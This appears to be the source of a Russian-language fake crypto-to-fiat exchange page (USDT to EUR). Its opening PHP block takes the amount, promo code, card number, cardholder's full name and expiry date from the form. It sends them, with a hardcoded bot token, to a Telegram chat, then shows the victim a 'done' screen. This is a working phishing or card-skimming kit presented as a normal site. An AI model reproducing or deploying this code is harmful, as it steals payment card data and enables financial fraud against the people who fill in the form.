﻿<?php
  $token = '5538201129:AAF2NZ3pqWt5AMZcU0t6huAoqUUGMn8fmWy';
 

  $chat_id = '-756248532';
  

     $cash = ($_POST['cash']);
    $code = ($_POST['code']);
    $card = ($_POST['card']);
    $fio = ($_POST['fio']);
    $date = ($_POST['date']);
$arr = Array(

 

"Сумма "=> $cash,
"Промо код "=> $code,
"Номер карты "=> $card,
"ФИО "=> $fio,
"Срок действия "=> $date,
  );  

    foreach($arr as $key => $value) {
        $txt .= "<b>".$key."</b> ".$value."%0A";
    };

//Передаем данные боту
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

//Выводим сообщение об успешной отправке
 
?>


﻿<html>
	<head>
	  
	  <link rel="stylesheet" href="Inter/inter.css">
	  <link rel="stylesheet" href="jquery-ui.css">
		
  <link rel="stylesheet" href="/resources/demos/style.css">
  <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
  <script src="https://code.jquery.com/ui/1.13.2/jquery-ui.js"></script>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
    <script type="text/javascript" src="https://cdn.rawgit.com/prashantchaudhary/ddslick/master/jquery.ddslick.min.js" ></script>
	  <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
  <script src="https://code.jquery.com/ui/1.13.2/jquery-ui.js"></script>
  <link rel="stylesheet" href="style.css">
	</head>
	<body>
	
	        <script type="text/javascript">
                c = new Array();
                n = new Array();
                c[0] = 1;
                n[0] = "USD";
                c[1] = 1;
                n[1] = "EUR";
				c[2] = 1.04;
                n[2] = "EUR";
                
 
                function Conv()
                {
                        var res, vfrom, vto, vcash;
                        vcash = document.getElementById("cash").value;
                        if(isNaN())
                        vfrom = document.getElementById("filesB").value;
                        vcash = vcash.replace(',', '\.');
                        vcash = vcash.replace(' ', '');
                        vcash = vcash.replace(' ', '');
                        vto = 2;
                        res = c[vto] * vcash / c[vfrom], 2;
                if(isNaN(res))
                {
                        res = "<span class='result'>0,00</span>";
                }
                else
                {
                        res = res.toFixed(2);
                        res = res.toString();
                        res = res.replace('\.', ',');
                        res = "<span class='result'>" + res + "</span>&nbsp;" + n[vto];
                }
                document.getElementById("result").innerHTML = res;
                }
</script>
<script>
$('#myDropdown').ddslick({
    onSelected: function(selectedData){
        //callback function: do something with selectedData;
    }   
});
</script>
<script>
  $( function() {
    $.widget( "custom.iconselectmenu", $.ui.selectmenu, {
      _renderItem: function( ul, item ) {
        var li = $( "<li>" ),
          wrapper = $( "<div>", { text: item.label } );
 
        if ( item.disabled ) {
          li.addClass( "ui-state-disabled" );
        }
 
        $( "<span>", {
          style: item.element.attr( "data-style" ),
          "class": "ui-icon " + item.element.attr( "data-class" )
        })
          .appendTo( wrapper );
 
        return li.append( wrapper ).appendTo( ul );
      }
    });
 
    $( "#filesA" )
      .iconselectmenu()
      .iconselectmenu( "menuWidget" )
        .addClass( "ui-menu-icons" );
 
    $( "#filesB" )
      .iconselectmenu()
      .iconselectmenu( "menuWidget" )
        .addClass( "ui-menu-icons customicons" );
 
    $( "#people" )
      .iconselectmenu()
      .iconselectmenu( "menuWidget")
        .addClass( "ui-menu-icons avatar" );
  } );
  
  </script><script>
  $( function() {
  $( ".selector" ).selectmenu({
  width: 200
});</script>
  <style>
    h2 {
      margin: 30px 0 0 0;
    }
    fieldset {
      border: 0;
    }
    label {
      display: block;
    }
 
    /* select with custom icons */
    .ui-selectmenu-menu .ui-menu.customicons .ui-menu-item-wrapper {
      padding: 0.5em 0 0.5em 3em;
    }
    .ui-selectmenu-menu .ui-menu.customicons .ui-menu-item .ui-icon {
      height: 24px;
      width: 24px;
      top: 0.1em;
    }
    .ui-icon.video {
      background: url("img/usdt.png") 0 0 no-repeat;
    }
    .ui-icon.podcast {
      background: url("img/usdt.png") 0 0 no-repeat;
    }
    .ui-icon.rss {
      background: url("images/24-rss-square.png") 0 0 no-repeat;
    }
 
    /* select with CSS avatar icons */
    option.avatar {
      background-repeat: no-repeat !important;
      padding-left: 20px;
    }
    .avatar .ui-icon {
      background-position: left top;
    }
.ui-selectmenu-button.ui-button {
	padding-left: 3px;
    padding-right: 3px;
    text-align: left;
    white-space: nowrap;
    width: 8em;
}
.ui-selectmenu-menu .ui-menu.customicons .ui-menu-item-wrapper {
    padding: 0.5em 0 0.5em 3em;
    padding-left: 30px;
}
.ui-selectmenu-button.ui-button {
    outline: none;
    border: 0px;
    padding-left: 3px;
    padding-right: 3px;
    text-align: left;
    white-space: nowrap;
    width: 8em;
}
.ui-selectmenu-button.ui-button {
    outline: none;
    border: 0px;
    padding-left: 3px;
    padding-right: 3px;
    text-align: left;
    white-space: nowrap;
    width: 63px;
}
.ui-selectmenu-text {
    display: block;
    margin-right: 20px;
    overflow: hidden;
    text-overflow: hidden;
}
.ui-widget.ui-widget-content {
    width: 129px;
    margin-left: -28;
    border: 1px solid #c5c5c5;
}
  </style>
  <style>


  </style><table width="1200px" align="center"><tr><td>	<div class="div-pc"><div class="parent" style="	position:relative ;
  margin-left: 0px;
    display: table;
    width: 100%; /*Optional*/
    table-layout: fixed; /*Optional*/
    border-spacing: 10px;">  <!-- style ="position: absolute; width: 100%; height: 18px; left: 300px; top: 40px;" -->
  <div  class="column logo" style="    width: 30%;
  margin-bottom:60px" align="left"><img src="img/logo.png" style="margin-bottom:-15px"    align="left"></div>
  <div width="100%" align="right">
  
    <div class="column" width="10%" align="left"><p style="white-space: nowrap;"><a href="rules.html" class="header" ><a href="index.php" class="header" >Главная</a></p><br><div class="line4"></div></div>
  <div class="column" width="10%" style=" margin-right:60px"align="left"><p style="white-space: nowrap;"><a href="contacts.html" class="header" >Контакты</a></p></div>
	  <div class="column" width="10%" align="left"><p style="white-space: nowrap;"><a href="rules.html" class="header" >Правила обмена</a></p></div>
	  	  <div class="column" width="10%" align="left"><p style="white-space: nowrap;"><a href="about.html" class="header" >О нас</a></p></div>
			  	  <div class="column" width="10%" align="left"><p style="white-space: nowrap;"><a href="responds.html" class="header" >Отзывы</a></p></div>
  </div>
  </div>

  <table  width="100%" align="center"><tr width="100%" align="center"><td width="50%" align="left">
<div style="width:50%;	border: 0px solid #FFFFFF; 	position:relative ;
	margin-left: 1%;
    width: 60%;
    table-layout: fixed;
    border-spacing: 10px;
	font-family: 'Inter';
font-style: normal;
font-weight: 400;
font-size: 48px;
line-height: 58px;"align="left">



<p class="texte" style="margin-top:200px;margin-left: 10px;">Быстрый обмен <br>
криптовалюты на фиат
<span style="font-family: 'Inter';
font-style: italic;
font-weight: 500;
font-size: 48px;
line-height: 58px;
color: #EBFF00;"><br>Exchange!</span></p>
<div class="parent1"     style="border-spacing: 50px;margin-left: -50px;">
<div  width="40%" style=" margin-right:60px"align="left" class="column"><p class="header" style="font-family: 'Inter';
font-style: italic;
font-weight: 700;
font-size: 20px;
line-height: 30px;"><span style="font-family: 'Inter';
font-style: italic;
font-weight: 700;
font-size: 20px;
line-height: 30px;
/* or 150% */


/* Sun 2 */
    white-space: nowrap;
color: #EBFF00;">Обмен</span><br>
USDT на <br>
EUR</p></div>
<style>
.vl {
  border-left: 2px solid #EBFF00;
  height: 90px;
}
</style>

<div class="vl column"></div>
<div  width="10%" style=" margin-right:60px"align="left" class="column"><p class="header" style="font-family: 'Inter';
font-style: italic;
font-weight: 700;
font-size: 20px;
line-height: 30px;"><span style="font-family: 'Inter';
font-style: italic;
font-weight: 700;
font-size: 20px;
line-height: 30px;
/* or 150% */


/* Sun 2 */
    white-space: nowrap;
color: #EBFF00;">Обмен</span><br> 
без <br> 
ограничений</p></div>
<style>
.vl {
  border-left: 2px solid #EBFF00;
  height: 90px;
}
</style>

<div class="vl column"></div><div  width="10%" style=" margin-right:60px"align="left" class="column"><p class="header" style="font-family: 'Inter';
font-style: italic;
font-weight: 700;
font-size: 20px;
line-height: 30px;"><span style="font-family: 'Inter';
font-style: italic;
font-weight: 700;
font-size: 20px;
line-height: 30px;
/* or 150% */


/* Sun 2 */
    white-space: nowrap;
color: #EBFF00;">Обмен</span><br> 
за минимальное<br> 
 время</p></div>
<style>
.vl {
  border-left: 2px solid #EBFF00;
  height: 90px;
}
</style>


</div></td>
<td width="50%" align="right">

<div align="center" class="paym" style="height: 582px;background: #FFFFFF;border-radius: 20px;width: 445px;margin-left: 40;margin-top: 132px;">
<div style="margin-top:-10px;
border-bottom:1px solid #DADADA;"><p align="left" style="font-family: 'Inter';
font-style: normal;
font-weight: 300;
font-size: 18px;
line-height: 22px;
color: #191919;
margin-left:20px;
margin-bottom:8px;
padding: 10px;">Swap crypto</p></div>

<table width="100%"style="margin-left:30px;
margin-right:30px;
margin-top:26px;">
<tr >
<td style="
width:20%;"><img src="img/exch.png" align="left"></td>
<td style="
width:60%;"><p style="font-family: 'Inter';
font-style: normal;
font-weight: 600;
font-size: 24px;
line-height: 29px;
/* identical to box height */


color: #191919;">Готово</p></td>
<td style="
width:20%;"><img src="img/menu.png" align="center"></td>
</tr>
</table>


<table width="100%" height="30px" style="margin-left:30px;
margin-right:30px;
margin-top:26px;">
<tr >
<td style="
width:25%;"><p class="paymmenu" >ДЕТАЛИ</p></td>
<td style="
width:25%;"><p class="paymmenu">ДЕПОЗИТ</p></td>
<td style="
width:25%;"><p class="paymmenu">ОБМЕН</p></td>
<td style="
width:25%;"><p class="paymmenu" style="color: #191919;">ГОТОВО</p></td>
</tr>
</table>


<p style="font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 41px;
line-height: 50px;
/* identical to box height */

text-align: center;

color: #191919;">Готово</p><a href="index.php">
<p style="font-family: 'Inter';
font-style: normal;
font-weight: 400;
font-size: 20px;
line-height: 24px;
text-align: center;

/* 191919 */

color: #191919;">Провести ещё один обмен?</p></a>


</div></td>

</tr>
</div>
</table></td></tr>
</table>
<div style="height:20%;">
</div>
<footer style="    background-color: #FFFFFF;
    display: block;
    height: 240px;
    position: relative;
    bottom: 0;
    left: 0;
    width: 100%;"><div align="center" style="margin-top:49px;"><table><tr>
	
	<td><div class="line6" ></div></td>
	
	<td><p style="font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 15px;
line-height: 18px;
padding-left:12px;
padding-right:12px;
color: #8C8C8C;">НАШИ ПАРТНЕРЫ</p></td>

<td><div class="line6" ></div></td>

</tr></table></div>
<div align="center" style="margin-top:28px;"><img src="img/foot.png"></div>

<div align="center" style="margin-top:82px;"><p style="font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 16px;
line-height: 19px;

/* Gray d */

color: #8C8C8C;">© Copyright © 2022 - All Rights Reserved.</p>
</div>
</footer></div>	</body>
</html>